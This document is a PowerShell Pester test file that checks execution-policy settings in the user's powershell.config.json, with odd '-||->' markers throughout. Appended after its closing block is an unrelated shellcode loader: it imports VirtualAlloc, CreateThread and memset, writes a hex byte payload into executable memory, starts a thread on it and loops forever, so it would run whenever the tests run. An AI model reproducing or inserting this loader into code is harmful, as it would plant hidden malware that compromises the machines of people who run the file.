







 -||-> try {
    
     -||-> $IsInbox = $PSHOME.EndsWith('\WindowsPowerShell\v1.0', [System.StringComparison]::OrdinalIgnoreCase) <-||- 
     -||-> $productName = "PowerShell" <-||- 

    
     -||-> $originalDefaultParameterValues = $PSDefaultParameterValues.Clone() <-||- 
     -||-> $IsNotSkipped = ( -||-> $IsWindows -and !$IsInbox <-||- ) <-||-  
     -||-> $PSDefaultParameterValues["it:skip"] = !$IsNotSkipped <-||- 

     -||-> Describe "User-Specific powershell.config.json Modifications" -Tags "CI" {

         -||-> BeforeAll {
             -||-> if ( -||-> $IsNotSkipped <-||- ) {
                
                 -||-> $userSettingsDir = [System.IO.Path]::Combine($env:USERPROFILE, "Documents", $productName) <-||- 
                 -||-> $userPropertiesFile =  -||-> Join-Path $userSettingsDir "powershell.config.json" <-||-  <-||- 

                
                 -||-> $backupPropertiesFile = "" <-||- 
                 -||-> if ( -||-> Test-Path $userPropertiesFile <-||- ) {
                     -||-> $backupPropertiesFile =  -||-> Join-Path $userSettingsDir "ORIGINAL_powershell.config.json" <-||-  <-||- 
                     -||-> Copy-Item -Path $userPropertiesFile -Destination $backupPropertiesFile -Force -ErrorAction Continue <-||- 
                }
                elseif ( -||-> -not ( -||-> Test-Path $userSettingsDir <-||- ) <-||- ) {
                    
                     -||-> $null =  -||-> New-Item -Type Directory -Path $userSettingsDir -Force -ErrorAction SilentlyContinue <-||-  <-||- 
                } <-||- 

                
                 -||-> $processExecutionPolicy =  -||-> Get-ExecutionPolicy -Scope Process <-||-  <-||- 
                 -||-> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Undefined <-||- 
            } <-||- 
        } <-||- 

         -||-> BeforeEach {
             -||-> if ( -||-> $IsNotSkipped <-||- ) {
                 -||-> Set-Content -Path $userPropertiesFile -Value '{"Microsoft.PowerShell:ExecutionPolicy":"RemoteSigned"}' <-||- 
            } <-||- 
        } <-||- 

         -||-> AfterAll {
             -||-> if ( -||-> $IsNotSkipped <-||- ) {
                 -||-> if ( -||-> -not $backupPropertiesFile <-||- )
                {
                    
                     -||-> Remove-Item -Path $userPropertiesFile -Force -ErrorAction SilentlyContinue <-||- 
                }
                else
                {
                    
                     -||-> Move-Item -Path $backupPropertiesFile -Destination $userPropertiesFile -Force -ErrorAction Continue <-||- 
                } <-||- 

                
                 -||-> Set-ExecutionPolicy -Scope Process -ExecutionPolicy $processExecutionPolicy <-||- 
            } <-||- 
        } <-||- 

         -||-> It "Verify Queries to Missing File Return Default Value" {
             -||-> Remove-Item $userPropertiesFile -Force <-||- 

             -||-> Get-ExecutionPolicy -Scope CurrentUser | Should -Be "Undefined" <-||- 

            
             -||-> {  -||-> $propFile =  -||-> Get-Item $userPropertiesFile -ErrorAction Stop <-||-  <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Queries for Non-Existant Properties Return Default Value" {
            
             -||-> Set-Content -Path $userPropertiesFile -Value "{}" <-||- 

             -||-> Get-ExecutionPolicy -Scope CurrentUser | Should -Be "Undefined" <-||- 
        } <-||- 

         -||-> It "Verify Writes Update Properties" {
             -||-> Get-Content -Path $userPropertiesFile | Should -Be '{"Microsoft.PowerShell:ExecutionPolicy":"RemoteSigned"}' <-||- 
             -||-> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass <-||- 
             -||-> Get-Content -Path $userPropertiesFile | Should -Be '{"Microsoft.PowerShell:ExecutionPolicy":"Bypass"}' <-||- 
        } <-||- 

         -||-> It "Verify Writes Create the File if Not Present" {
             -||-> Remove-Item $userPropertiesFile -Force <-||- 
             -||-> Test-Path $userPropertiesFile | Should -BeFalse <-||- 
             -||-> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass <-||- 
             -||-> Get-Content -Path $userPropertiesFile | Should -Be '{"Microsoft.PowerShell:ExecutionPolicy":"Bypass"}' <-||- 
        } <-||- 
    } <-||- 
}
finally {
     -||-> $global:PSDefaultParameterValues = $originalDefaultParameterValues <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xdd,0xd9,0x74,0x24,0xf4,0x5d,0xbf,0x00,0x60,0x3e,0xbe,0x2b,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x03,0x7d,0x18,0x83,0xc5,0x04,0x82,0xcb,0x42,0xec,0xc0,0x34,0xbb,0xec,0xa4,0xbd,0x5e,0xdd,0xe4,0xda,0x2b,0x4d,0xd5,0xa9,0x7e,0x61,0x9e,0xfc,0x6a,0xf2,0xd2,0x28,0x9c,0xb3,0x59,0x0f,0x93,0x44,0xf1,0x73,0xb2,0xc6,0x08,0xa0,0x14,0xf7,0xc2,0xb5,0x55,0x30,0x3e,0x37,0x07,0xe9,0x34,0xea,0xb8,0x9e,0x01,0x37,0x32,0xec,0x84,0x3f,0xa7,0xa4,0xa7,0x6e,0x76,0xbf,0xf1,0xb0,0x78,0x6c,0x8a,0xf8,0x62,0x71,0xb7,0xb3,0x19,0x41,0x43,0x42,0xc8,0x98,0xac,0xe9,0x35,0x15,0x5f,0xf3,0x72,0x91,0x80,0x86,0x8a,0xe2,0x3d,0x91,0x48,0x99,0x99,0x14,0x4b,0x39,0x69,0x8e,0xb7,0xb8,0xbe,0x49,0x33,0xb6,0x0b,0x1d,0x1b,0xda,0x8a,0xf2,0x17,0xe6,0x07,0xf5,0xf7,0x6f,0x53,0xd2,0xd3,0x34,0x07,0x7b,0x45,0x90,0xe6,0x84,0x95,0x7b,0x56,0x21,0xdd,0x91,0x83,0x58,0xbc,0xfd,0x60,0x51,0x3f,0xfd,0xee,0xe2,0x4c,0xcf,0xb1,0x58,0xdb,0x63,0x39,0x47,0x1c,0x84,0x10,0x3f,0xb2,0x7b,0x9b,0x40,0x9a,0xbf,0xcf,0x10,0xb4,0x16,0x70,0xfb,0x44,0x97,0xa5,0x96,0x41,0x0f,0x4c,0x03,0x1a,0x5e,0x38,0xc9,0x9a,0x71,0xe5,0x44,0x7c,0x21,0x45,0x07,0xd1,0x81,0x35,0xe7,0x81,0x69,0x5c,0xe8,0xfe,0x89,0x5f,0x22,0x97,0x23,0xb0,0x9b,0xcf,0xdb,0x29,0x86,0x84,0x7a,0xb5,0x1c,0xe1,0xbc,0x3d,0x93,0x15,0x72,0xb6,0xde,0x05,0xe2,0x36,0x95,0x74,0xa4,0x49,0x03,0x12,0x48,0xdc,0xa8,0xb5,0x1f,0x48,0xb3,0xe0,0x57,0xd7,0x4c,0xc7,0xec,0xde,0xd8,0xa8,0x9a,0x1e,0x0d,0x29,0x5a,0x49,0x47,0x29,0x32,0x2d,0x33,0x7a,0x27,0x32,0xee,0xee,0xf4,0xa7,0x11,0x47,0xa9,0x60,0x7a,0x65,0x94,0x47,0x25,0x96,0xf3,0x59,0x19,0x41,0x3d,0x2c,0x73,0x51 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



